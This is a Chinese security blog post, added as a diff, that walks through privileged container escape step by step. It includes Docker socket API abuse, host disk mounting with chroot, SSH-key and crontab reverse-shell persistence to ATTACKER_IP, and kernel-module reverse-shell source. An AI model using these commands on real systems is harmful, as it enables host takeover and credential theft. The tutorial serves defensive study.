@@ -1,0 +1,1050 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>特权容器逃逸全链：从容器 Shell 到宿主机 root 的完整攻击路径 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../calendar.html" >日历</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>特权容器逃逸全链：从容器 Shell 到宿主机 root 的完整攻击路径</h1>
+<time>2026-08-03</time>
+<ul>
+<li>技术
+Slug: 特权容器逃逸全链-从容器shell到宿主机root的完整攻击路径</li>
+</ul>
+<hr />
+<h2>概述</h2>
+<h3>特权容器逃逸的背景与安全意义</h3>
+<p>容器并非虚拟机。虚拟机通过 Hypervisor 提供硬件级隔离，每个 VM 拥有独立内核；而容器本质上是宿主机上一个被 namespaces（命名空间）与 cgroups（控制组）"装扮"过的普通进程，所有容器共享同一个宿主机内核。这意味着容器隔离的强度，完全取决于运行时配置是否遵循最小权限原则。</p>
+<p>在所有容器配置失误中，<code>--privileged</code>（特权模式）是最致命的一种。特权容器会获得几乎所有 Linux capabilities，并且设备 cgroup 不再对其做任何限制——容器内的 root 几乎等同于宿主机上的 root。一旦攻击者拿到特权容器的 Shell，逃逸到宿主机往往只是几条命令的事。</p>
+<p>特权容器逃逸的安全意义在于：它不是利用某个内核 0day，而是利用内核自身提供的、本应"只给宿主 root 用"的合法机制（如 mount、内核模块加载、cgroup release_agent）。这些机制本身不感知容器的命名空间边界，因此一旦容器被赋予过高权限，隔离便形同虚设。在云原生环境中，一个特权容器逃逸往往意味着整个节点的沦陷，进而通过 Node 上的 ServiceAccount Token 横向渗透整个 Kubernetes 集群。</p>
+<h3>常见特权容器误配置场景</h3>
+<p>在实际生产环境中，特权容器的误配置往往源于"图省事"而非"不知道风险"。以下是高危场景清单：</p>
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>误配置方式</th>
+<th>出现频率</th>
+<th>实际风险</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CI/CD 构建容器</td>
+<td><code>docker run --privileged</code> 构建 Docker-in-Docker</td>
+<td>高</td>
+<td>构建节点被攻击者完全接管</td>
+</tr>
+<tr>
+<td>调试/排障容器</td>
+<td><code>kubectl debug --privileged</code> 后忘记清理</td>
+<td>中</td>
+<td>调试容器成为持久化后门</td>
+</tr>
+<tr>
+<td>监控/Sidecar 容器</td>
+<td>挂载 <code>/var/run/docker.sock</code> 以采集指标</td>
+<td>高</td>
+<td>Docker API 完全暴露</td>
+</tr>
+<tr>
+<td>设备访问容器</td>
+<td><code>--device /dev/sda</code> 或 <code>--privileged</code> 访问 GPU</td>
+<td>中</td>
+<td>宿主机文件系统被直接读写</td>
+</tr>
+<tr>
+<td>旧版存储插件</td>
+<td>CSI/Flexvolume 以特权运行</td>
+<td>中</td>
+<td>节点存储栈被攻击</td>
+</tr>
+<tr>
+<td>安全工具自身</td>
+<td>部分运行时安全工具需特权采集事件</td>
+<td>低</td>
+<td>"守护者"反成"突破口"</td>
+</tr>
+</tbody>
+</table>
+<p>最危险的一点是：许多开发者误以为 <code>--privileged</code> 只是"获得 root 权限"，而实际上它还解除了设备访问限制、capability 限制、AppArmor/SELinux 限制以及 seccomp 过滤——这等于一次性拆掉了容器的所有隔离栅栏。</p>
+<h3>攻击链整体架构图</h3>
+<div class="highlight"><pre><span></span><code>┌──────────────────────────────────────────────────────────────────────────┐
+│                  特权容器逃逸攻击链全景                                      │
+│                                                                          │
+│  阶段一：初始立足        阶段二：权限确认        阶段三：逃逸执行           │
+│  ┌──────────────┐     ┌──────────────┐     ┌───────────────────────┐    │
+│  │ Web漏洞RCE   │────→│ capabilities │────→│ Docker Socket 创建新容器│    │
+│  │ 反弹Shell    │     │ 探测         │     │ 块设备直接挂载          │    │
+│  │ 钓鱼/供应链  │     │ 挂载点枚举   │     │ cgroup release_agent   │    │
+│  │ 已植入容器   │     │ 设备文件发现 │     │ 内核模块加载            │    │
+│  └──────────────┘     └──────────────┘     └───────────┬───────────┘    │
+│                                                         │                │
+│  阶段四：宿主机控制     阶段五：持久化与横向                          │
+│  ┌──────────────────────────────┐     ┌──────────────────────────┐     │
+│  │ chroot 进入宿主根文件系统    │────→│ 写入 systemd 计划任务     │     │
+│  │ 读取宿主机 /etc/shadow      │     │ 窃取 Node SA Token        │     │
+│  │ 以宿主 root 执行任意命令    │     │ 横向渗透 K8s 集群          │     │
+│  └──────────────────────────────┘     └──────────────────────────┘     │
+│                                                                          │
+│  核心逃逸路径（任选其一即可）:                                              │
+│  ① Docker Socket → 创建挂载宿主根的特权容器                                │
+│  ② /dev/sda1 块设备 → mount + chroot                                     │
+│  ③ CAP_SYS_MODULE → insmod 恶意内核模块                                  │
+│  ④ cgroup v1 release_agent → 宿主命名空间执行任意命令                      │
+└──────────────────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<hr />
+<h2>攻击链复现</h2>
+<h3>环境搭建</h3>
+<h4>Docker 特权容器配置</h4>
+<p>在一个合法的测试环境中（建议使用独立的虚拟机，切勿在生产环境复现），准备一台 Ubuntu 22.04 LTS 宿主机，安装 Docker Engine。以下命令创建一个特权容器，模拟被攻击者攻破的容器：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 1. 拉取基础镜像</span>
+docker<span class="w"> </span>pull<span class="w"> </span>ubuntu:22.04
+
+<span class="c1"># 2. 以特权模式启动容器（这是&quot;误配置&quot;的根源）</span>
+<span class="c1">#    --privileged 解除所有 capability 限制与设备 cgroup 限制</span>
+<span class="c1">#    同时挂载 docker.sock 用于复现 Docker Socket 逃逸路径</span>
+docker<span class="w"> </span>run<span class="w"> </span>-dit<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--name<span class="w"> </span>victim-container<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--privileged<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-v<span class="w"> </span>/var/run/docker.sock:/var/run/docker.sock<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>ubuntu:22.04<span class="w"> </span>/bin/bash
+
+<span class="c1"># 3. 验证特权状态：进入容器</span>
+docker<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>-it<span class="w"> </span>victim-container<span class="w"> </span>/bin/bash
+</code></pre></div>
+
+<h4>攻击者初始 Shell 获取</h4>
+<p>攻击者的初始 Shell 通常来源于 Web 应用 RCE、反弹 Shell 或供应链植入。为聚焦逃逸技术本身，本文假设攻击者已通过某种方式获得容器内的非特权用户 Shell，并通过 <code>find / -perm -4000 2&gt;/dev/null</code> 等常规手段完成容器内提权至 root。后续所有逃逸操作均以容器内 root 身份进行。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 容器内确认当前身份与权限</span>
+id
+<span class="c1"># uid=0(root) gid=0(root) groups=0(root)</span>
+
+<span class="c1"># 确认是否处于容器环境</span>
+cat<span class="w"> </span>/proc/1/cgroup<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-1
+<span class="c1"># .../docker/&lt;container-id&gt;  ← 确认在容器中</span>
+
+ls<span class="w"> </span>-la<span class="w"> </span>/.dockerenv<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;in container&quot;</span>
+<span class="c1"># -rw-r--r-- 1 root root 0 ... /.dockerenv</span>
+</code></pre></div>
+
+<h3>第一步：容器内信息收集</h3>
+<p>逃逸的第一步永远是确认"我到底拥有多少权限"。在容器中，关键信息包括：capabilities 集合、挂载点、可见的设备文件、内核版本与 cgroup 版本。</p>
+<h4>capabilities 探测</h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># 查看当前进程的全部 capabilities</span>
+<span class="c1"># 特权容器的 CapEff 会包含几乎所有 capability（约 40 个）</span>
+cat<span class="w"> </span>/proc/self/status<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;Cap(Inh|Prm|Eff|Bnd|Amb)&#39;</span>
+
+<span class="c1"># 输出示例（特权容器）：</span>
+<span class="c1"># CapInh: 0000000000000000</span>
+<span class="c1"># CapPrm: 0000003fffffffff</span>
+<span class="c1"># CapEff: 0000003fffffffff   ← 全 1，表示几乎全部 capability</span>
+<span class="c1"># CapBnd: 0000003fffffffff</span>
+<span class="c1"># CapAmb: 0000000000000000</span>
+
+<span class="c1"># 将十六进制 capability 掩码解码为可读名称</span>
+capsh<span class="w"> </span>--decode<span class="o">=</span>0000003fffffffff
+<span class="c1"># 0x0000003fffffffff=cap_chown,cap_dac_override,...,cap_sys_admin,...,cap_sys_module,...</span>
+</code></pre></div>
+
+<p><code>CapEff</code> 为 <code>0000003fffffffff</code> 即可基本确认这是一个特权容器。普通容器的 <code>CapEff</code> 通常只有 14 个 capability，掩码为 <code>00000000a80425fb</code>，不包含 <code>cap_sys_admin</code>、<code>cap_sys_module</code>、<code>cap_sys_ptrace</code> 等高危项。</p>
+<h4>挂载点枚举</h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># 查看所有挂载点，重点关注是否挂载了宿主机敏感路径</span>
+mount<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;(docker.sock|/dev/sd|/proc|/sys|host)&#39;</span>
+
+<span class="c1"># 输出示例：</span>
+<span class="c1"># /var/run/docker.sock on /var/run/docker.sock type socket</span>
+<span class="c1"># /dev/sda1 on /etc/hosts type ext4 (rw,relatime)</span>
+
+<span class="c1"># 查看是否挂载了宿主机根或 docker.sock</span>
+cat<span class="w"> </span>/proc/mounts<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;docker.sock|/host&#39;</span>
+</code></pre></div>
+
+<h4>设备文件发现</h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># 列出所有块设备（特权容器可见宿主机磁盘）</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/dev/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;sd|nvme|vd&#39;</span>
+
+<span class="c1"># 输出示例：</span>
+<span class="c1"># brw-rw---- 1 root disk 8, 1 ... /dev/sda1</span>
+<span class="c1"># brw-rw---- 1 root disk 8, 2 ... /dev/sda2</span>
+
+<span class="c1"># 查看块设备对应的文件系统</span>
+fdisk<span class="w"> </span>-l<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;/dev/sd|/dev/nvme&#39;</span>
+<span class="c1"># /dev/sda1  *  2048  1050623  1048576  512M  b W95 FAT32</span>
+<span class="c1"># /dev/sda2     1050624 625139711 624089088 297.7G  83 Linux</span>
+</code></pre></div>
+
+<h4>关键信息汇总</h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># 内核版本（决定可用的逃逸技术）</span>
+uname<span class="w"> </span>-r
+<span class="c1"># 5.15.0-91-generic</span>
+
+<span class="c1"># cgroup 版本（v1 才有 release_agent 逃逸）</span>
+stat<span class="w"> </span>-fc<span class="w"> </span>%T<span class="w"> </span>/sys/fs/cgroup/
+<span class="c1"># tmpfs    ← 表示 cgroup v1（hybrid 模式）</span>
+<span class="c1"># cgroup2fs ← 表示 cgroup v2（无 release_agent 逃逸）</span>
+
+<span class="c1"># 是否能访问内核模块加载</span>
+which<span class="w"> </span>insmod<span class="w"> </span>modprobe<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<span class="c1"># /sbin/insmod</span>
+<span class="c1"># /sbin/modprobe</span>
+</code></pre></div>
+
+<h3>第二步：Capabilities 滥用</h3>
+<p>特权容器逃逸的核心，是滥用被错误授予的高危 capability。以下逐一分析三个最关键的 capability。</p>
+<h4>CAP_SYS_ADMIN 权限利用</h4>
+<p><code>CAP_SYS_ADMIN</code> 被戏称为"新的 root"，因为它赋予进程执行大量特权操作的能力，包括 mount、umount、创建命名空间、配置 cgroup 等。它几乎是所有非块设备逃逸路径的前提。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># CAP_SYS_ADMIN 允许在容器内执行 mount</span>
+<span class="c1"># 直接挂载宿主机磁盘分区到容器（逃逸路径一）</span>
+mkdir<span class="w"> </span>-p<span class="w"> </span>/tmp/hostfs
+mount<span class="w"> </span>/dev/sda2<span class="w"> </span>/tmp/hostfs
+
+<span class="c1"># 挂载成功后，/tmp/hostfs 即为宿主机根文件系统</span>
+ls<span class="w"> </span>/tmp/hostfs
+<span class="c1"># bin  boot  dev  etc  home  lib  ...  root  usr  var</span>
+
+<span class="c1"># 通过 chroot 切入宿主机文件系统，获得宿主机 root 视角</span>
+chroot<span class="w"> </span>/tmp/hostfs<span class="w"> </span>/bin/bash
+
+<span class="c1"># 此时已&quot;逃逸&quot;，可在宿主机文件系统视角下执行任意命令</span>
+cat<span class="w"> </span>/etc/shadow<span class="w">          </span><span class="c1"># 读取宿主机密码哈希</span>
+crontab<span class="w"> </span>-l<span class="w">               </span><span class="c1"># 查看宿主机计划任务</span>
+</code></pre></div>
+
+<p><code>CAP_SYS_ADMIN</code> 的危险在于它是"万能钥匙"——只要能 mount，就能挂载宿主磁盘、procfs、sysfs，进而获取或修改宿主机的一切。</p>
+<h4>CAP_SYS_PTRACE 权限利用</h4>
+<p><code>CAP_SYS_PTRACE</code> 允许进程使用 <code>ptrace()</code> 系统调用附加到任意进程，即使该进程属于其他命名空间。在容器与宿主机共享 PID 命名空间（<code>--pid=host</code>）的场景下，攻击者可 ptrace 宿主机进程，读取其内存或注入代码。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 前提：容器以 --pid=host 启动，可见宿主机进程</span>
+ps<span class="w"> </span>aux<span class="w"> </span><span class="p">|</span><span class="w"> </span>head
+<span class="c1"># 可看到宿主机所有进程（PID 从 1 开始）</span>
+
+<span class="c1"># 利用 ptrace 向宿主机进程注入 shellcode（概念性 PoC）</span>
+<span class="c1"># 以下 C 代码 ptrace_attach.c 编译后可附加到宿主机 init 进程</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/ptrace_inject.c<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
+<span class="s">// ptrace 注入 PoC — 仅用于授权测试</span>
+<span class="s">#include &lt;stdio.h&gt;</span>
+<span class="s">#include &lt;sys/ptrace.h&gt;</span>
+<span class="s">#include &lt;unistd.h&gt;</span>
+
+<span class="s">int main(int argc, char *argv[]) {</span>
+<span class="s">    pid_t target = atoi(argv[1]);</span>
+<span class="s">    // 附加到目标进程（需 CAP_SYS_PTRACE）</span>
+<span class="s">    if (ptrace(PTRACE_ATTACH, target, NULL, NULL) &lt; 0) {</span>
+<span class="s">        perror(&quot;ptrace attach&quot;);</span>
+<span class="s">        return 1;</span>
+<span class="s">    }</span>
+<span class="s">    waitpid(target, NULL, 0);</span>
+<span class="s">    // 此处可 PTRACE_POKETEXT 注入 shellcode 或 PTRACE_GETREGS 篡改寄存器</span>
+<span class="s">    printf(&quot;[+] Attached to host process %d\n&quot;, target);</span>
+<span class="s">    ptrace(PTRACE_DETACH, target, NULL, NULL);</span>
+<span class="s">    return 0;</span>
+<span class="s">}</span>
+<span class="s">EOF</span>
+gcc<span class="w"> </span>-o<span class="w"> </span>/tmp/ptrace_inject<span class="w"> </span>/tmp/ptrace_inject.c
+<span class="c1"># /tmp/ptrace_inject 1   ← 附加到宿主机 init 进程</span>
+</code></pre></div>
+
+<p>即便不共享 PID 命名空间，<code>CAP_SYS_PTRACE</code> 结合 <code>CAP_SYS_ADMIN</code>（创建新的 PID namespace 并 setns）也可间接访问宿主机进程。</p>
+<h4>CAP_SYS_MODULE 权限利用</h4>
+<p><code>CAP_SYS_MODULE</code> 允许加载内核模块（<code>init_module</code>/<code>finit_module</code> 系统调用）。内核模块运行在 ring 0，完全无视任何命名空间隔离——一旦加载恶意模块，即可在宿主机内核态执行任意代码。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 验证是否有加载内核模块的权限</span>
+<span class="c1"># 注意：容器内默认无内核头文件，需从宿主机或镜像获取</span>
+ls<span class="w"> </span>/lib/modules/<span class="k">$(</span>uname<span class="w"> </span>-r<span class="k">)</span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># 利用方式见第五步&quot;内核模块加载&quot;</span>
+</code></pre></div>
+
+<h4>各 capability 的逃逸路径分析</h4>
+<table>
+<thead>
+<tr>
+<th>Capability</th>
+<th>直接逃逸路径</th>
+<th>是否需额外条件</th>
+<th>危害等级</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CAP_SYS_ADMIN</td>
+<td>mount 宿主磁盘 → chroot</td>
+<td>可见块设备</td>
+<td>极高</td>
+</tr>
+<tr>
+<td>CAP_SYS_ADMIN</td>
+<td>挂载 cgroup v1 → release_agent</td>
+<td>cgroup v1</td>
+<td>极高</td>
+</tr>
+<tr>
+<td>CAP_SYS_PTRACE</td>
+<td>ptrace 宿主进程注入代码</td>
+<td>共享 PID NS 或可 setns</td>
+<td>高</td>
+</tr>
+<tr>
+<td>CAP_SYS_MODULE</td>
+<td>insmod 恶意内核模块</td>
+<td>内核头文件/预编译模块</td>
+<td>极高</td>
+</tr>
+<tr>
+<td>CAP_DAC_READ_SEARCH</td>
+<td>绕过文件权限读取宿主文件</td>
+<td>路径可达</td>
+<td>中</td>
+</tr>
+<tr>
+<td>CAP_NET_ADMIN</td>
+<td>篡改网络栈、ARP 欺骗宿主</td>
+<td>—</td>
+<td>中</td>
+</tr>
+</tbody>
+</table>
+<h3>第三步：Docker Socket 利用</h3>
+<h4>/var/run/docker.sock 挂载检测</h4>
+<p>Docker Socket（<code>/var/run/docker.sock</code>）是 Docker daemon 的 Unix 域套接字。一旦容器挂载了它，容器内进程就能通过 Docker API 完全控制宿主机上的 Docker daemon——等价于获得了宿主机 root 对容器编排的全部控制权。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 检测 Docker Socket 是否存在且可写</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/var/run/docker.sock
+<span class="c1"># srw-rw---- 1 root docker 0 ... /var/run/docker.sock</span>
+
+<span class="c1"># 测试能否与 Docker daemon 通信</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--unix-socket<span class="w"> </span>/var/run/docker.sock<span class="w"> </span>http://localhost/version<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-c<span class="w"> </span><span class="m">200</span>
+<span class="c1"># {&quot;Platform&quot;:{&quot;Name&quot;:&quot;Docker Engine&quot;},...,&quot;Version&quot;:&quot;24.0.7&quot;,...}</span>
+</code></pre></div>
+
+<p>能正常返回 JSON 即说明 Docker API 完全可用。</p>
+<h4>通过 Docker API 创建特权容器逃逸</h4>
+<p>核心思路：通过 Docker API 创建一个新的特权容器，并将宿主机根目录挂载进去，从而获得对宿主机文件系统的完全控制。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># === 完整 PoC：通过 Docker Socket 逃逸 ===</span>
+
+<span class="c1"># 1. 检测 Docker Socket</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/var/run/docker.sock
+
+<span class="c1"># 2. 拉取攻击用镜像（在宿主机 Docker daemon 上拉取）</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>--unix-socket<span class="w"> </span>/var/run/docker.sock<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">&quot;http://localhost/images/create?fromImage=alpine&amp;tag=latest&quot;</span>
+
+<span class="c1"># 3. 通过 Docker API 创建挂载宿主机根的特权容器</span>
+<span class="c1">#    关键参数：</span>
+<span class="c1">#    - &quot;Privileged&quot;: true      → 新容器也是特权容器</span>
+<span class="c1">#    - &quot;Binds&quot;: [&quot;/:/host&quot;]    → 将宿主机根目录挂载到 /host</span>
+<span class="c1">#    - &quot;Cmd&quot;: 逃逸后执行的命令</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>--unix-socket<span class="w"> </span>/var/run/docker.sock<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>http://localhost/containers/create?name<span class="o">=</span>pwn<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{</span>
+<span class="s1">    &quot;Image&quot;: &quot;alpine&quot;,</span>
+<span class="s1">    &quot;Cmd&quot;: [&quot;chroot&quot;, &quot;/host&quot;, &quot;/bin/bash&quot;],</span>
+<span class="s1">    &quot;Binds&quot;: [&quot;/:/host&quot;],</span>
+<span class="s1">    &quot;Privileged&quot;: true</span>
+<span class="s1">  }&#39;</span>
+<span class="c1"># 返回: {&quot;Id&quot;:&quot;&lt;container-id&gt;&quot;,&quot;Warnings&quot;:[]}</span>
+
+<span class="c1"># 4. 启动该容器</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>--unix-socket<span class="w"> </span>/var/run/docker.sock<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>http://localhost/containers/&lt;container-id&gt;/start
+
+<span class="c1"># 5. 在新容器中执行命令（此时已是宿主机 root 视角）</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>--unix-socket<span class="w"> </span>/var/run/docker.sock<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">&quot;http://localhost/containers/&lt;container-id&gt;/exec&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;Cmd&quot;:[&quot;cat&quot;,&quot;/host/etc/shadow&quot;],&quot;AttachStdout&quot;:true}&#39;</span>
+
+<span class="c1"># 6. 获取 exec 实例的输出</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>--unix-socket<span class="w"> </span>/var/run/docker.sock<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">&quot;http://localhost/exec/&lt;exec-id&gt;/start&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;Detach&quot;:false,&quot;Tty&quot;:false}&#39;</span>
+</code></pre></div>
+
+<p>更简洁的方式是直接在容器内安装 docker CLI，一条命令完成逃逸：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 或直接挂载宿主机根文件系统（CAP_SYS_ADMIN 路径）</span>
+mkdir<span class="w"> </span>-p<span class="w"> </span>/tmp/hostfs
+mount<span class="w"> </span>/dev/sda1<span class="w"> </span>/tmp/hostfs
+chroot<span class="w"> </span>/tmp/hostfs<span class="w"> </span>/bin/bash
+</code></pre></div>
+
+<p>Docker Socket 逃逸是云原生环境中最常见的逃逸方式之一，因为它不依赖任何内核漏洞，纯粹是配置失误导致的"权限倒挂"——容器内的低权限进程通过 socket 获得了宿主机上的最高权限。</p>
+<h3>第四步：设备文件直接挂载</h3>
+<p>特权容器的设备 cgroup 不做任何限制，因此容器内可以直接访问宿主机的块设备。这是最直接的逃逸方式，本质上与第二步的 <code>CAP_SYS_ADMIN</code> mount 路径相同，但更强调"设备可见性"这一前提。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 1. 枚举宿主机块设备</span>
+lsblk
+<span class="c1"># NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span>
+<span class="c1"># sda      8:0    0  300G  0 disk</span>
+<span class="c1"># ├─sda1   8:1    0  512M  0 part /boot/efi</span>
+<span class="c1"># ├─sda2   8:2    0  297G  0 part /</span>
+
+<span class="c1"># 2. 挂载宿主机根分区</span>
+mkdir<span class="w"> </span>-p<span class="w"> </span>/mnt/host
+mount<span class="w"> </span>/dev/sda2<span class="w"> </span>/mnt/host
+
+<span class="c1"># 3. 验证：此时可读写宿主机全部文件</span>
+ls<span class="w"> </span>/mnt/host/etc/shadow
+cat<span class="w"> </span>/mnt/host/etc/crontab
+
+<span class="c1"># 4. 写入 SSH 公钥实现持久化（宿主机层）</span>
+mkdir<span class="w"> </span>-p<span class="w"> </span>/mnt/host/root/.ssh
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ssh-ed25519 AAAA... attacker@kali&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/mnt/host/root/.ssh/authorized_keys
+
+<span class="c1"># 5. 或写入计划任务反弹 Shell</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;* * * * * root /bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1&#39;&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>&gt;&gt;<span class="w"> </span>/mnt/host/etc/crontab
+
+<span class="c1"># 6. chroot 获得完整宿主机 Shell</span>
+chroot<span class="w"> </span>/mnt/host<span class="w"> </span>/bin/bash
+</code></pre></div>
+
+<p>即便不是 <code>--privileged</code>，只要容器通过 <code>--device /dev/sda2</code> 显式挂载了块设备，同样可执行上述逃逸。这提醒我们：<code>--device</code> 参数同样危险，必须严格审计。</p>
+<h3>第五步：内核模块加载</h3>
+<p>当容器拥有 <code>CAP_SYS_MODULE</code> 时，可在容器内加载内核模块。内核模块运行在 ring 0，完全无视容器隔离——这是从容器直接进入宿主机内核态的"官方通道"。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># === 恶意内核模块 PoC（reverse_shell.ko）===</span>
+<span class="c1"># 该模块加载后在内核态创建一个反弹 Shell 的用户态进程</span>
+<span class="c1"># 模块源码 reverse_shell.c：</span>
+
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/reverse_shell.c<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
+<span class="s">/*</span>
+<span class="s"> * reverse_shell.ko — 内核模块逃逸 PoC（仅用于授权测试）</span>
+<span class="s"> * 加载后在宿主机内核态执行，调用 call_usermodehelper 反弹 Shell</span>
+<span class="s"> */</span>
+<span class="s">#include &lt;linux/module.h&gt;</span>
+<span class="s">#include &lt;linux/kernel.h&gt;</span>
+<span class="s">#include &lt;linux/init.h&gt;</span>
+<span class="s">#include &lt;linux/umh.h&gt;</span>
+
+<span class="s">MODULE_LICENSE(&quot;GPL&quot;);</span>
+<span class="s">MODULE_AUTHOR(&quot;PoC&quot;);</span>
+<span class="s">MODULE_DESCRIPTION(&quot;Container escape via CAP_SYS_MODULE&quot;);</span>
+
+<span class="s">static char *argv[] = { &quot;/bin/bash&quot;, &quot;-c&quot;,</span>
+<span class="s">    &quot;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1&quot;, NULL };</span>
+<span class="s">static char *envp[] = { &quot;HOME=/&quot;, &quot;PATH=/sbin:/bin:/usr/sbin:/usr/bin&quot;, NULL };</span>
+
+<span class="s">static int __init reverse_shell_init(void) {</span>
+<span class="s">    pr_info(&quot;[*] Loading escape module...\n&quot;);</span>
+<span class="s">    // call_usermodehelper 在宿主机 init 命名空间执行用户态命令</span>
+<span class="s">    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);</span>
+<span class="s">    pr_info(&quot;[+] Shell spawned on host\n&quot;);</span>
+<span class="s">    return 0;</span>
+<span class="s">}</span>
+
+<span class="s">static void __exit reverse_shell_exit(void) {</span>
+<span class="s">    pr_info(&quot;[*] Unloading escape module\n&quot;);</span>
+<span class="s">}</span>
+
+<span class="s">module_init(reverse_shell_init);</span>
+<span class="s">module_exit(reverse_shell_exit);</span>
+<span class="s">EOF</span>
+
+<span class="c1"># 编译 Makefile（需宿主机内核头文件）</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/Makefile<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
+<span class="s">obj-m += reverse_shell.o</span>
+<span class="s">KDIR := /lib/modules/$(shell uname -r)/build</span>
+<span class="s">all:</span>
+<span class="s">    make -C $(KDIR) M=$(PWD) modules</span>
+<span class="s">EOF</span>
+
+<span class="c1"># 编译并加载（在容器内执行，作用于宿主机内核）</span>
+make
+insmod<span class="w"> </span>reverse_shell.ko
+
+<span class="c1"># 此时宿主机内核已加载该模块，call_usermodehelper 在宿主机命名空间</span>
+<span class="c1"># 执行了反弹 Shell，攻击者在 ATTACKER_IP:4444 收到宿主机 root Shell</span>
+dmesg<span class="w"> </span><span class="p">|</span><span class="w"> </span>tail
+<span class="c1"># [+] Shell spawned on host</span>
+</code></pre></div>
+
+<p><code>call_usermodehelper</code> 是关键：它在宿主机的初始命名空间（initial namespace）中启动用户态进程，因此反弹的 Shell 直接就是宿主机 root，而非容器内进程。内核模块加载是所有逃逸方式中危害最大的，因为它绕过了一切用户态隔离。</p>
+<h3>第六步：cgroup release_agent 利用</h3>
